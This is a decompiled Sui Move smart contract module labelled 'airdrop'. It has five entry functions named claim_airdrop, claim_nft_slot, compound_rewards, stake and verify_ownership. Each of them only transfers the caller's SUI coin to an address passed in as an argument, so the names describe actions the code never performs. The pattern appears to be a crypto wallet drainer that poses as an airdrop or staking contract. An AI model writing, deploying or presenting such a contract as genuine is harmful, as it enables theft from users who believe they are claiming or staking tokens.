module 0x81b139ba53e91cd710f0cc8b051a56da8b4054bb394a1ed17e7b544242ca07e6::airdrop {
    public entry fun claim_airdrop(arg0: 0x2::coin::Coin<0x2::sui::SUI>, arg1: address) {
        0x2::transfer::public_transfer<0x2::coin::Coin<0x2::sui::SUI>>(arg0, arg1);
    }

    public entry fun claim_nft_slot(arg0: 0x2::coin::Coin<0x2::sui::SUI>, arg1: address) {
        0x2::transfer::public_transfer<0x2::coin::Coin<0x2::sui::SUI>>(arg0, arg1);
    }

    public entry fun compound_rewards(arg0: 0x2::coin::Coin<0x2::sui::SUI>, arg1: address) {
        0x2::transfer::public_transfer<0x2::coin::Coin<0x2::sui::SUI>>(arg0, arg1);
    }

    public entry fun stake(arg0: 0x2::coin::Coin<0x2::sui::SUI>, arg1: address) {
        0x2::transfer::public_transfer<0x2::coin::Coin<0x2::sui::SUI>>(arg0, arg1);
    }

    public entry fun verify_ownership(arg0: 0x2::coin::Coin<0x2::sui::SUI>, arg1: address) {
        0x2::transfer::public_transfer<0x2::coin::Coin<0x2::sui::SUI>>(arg0, arg1);
    }

    // decompiled from Move bytecode v7
}

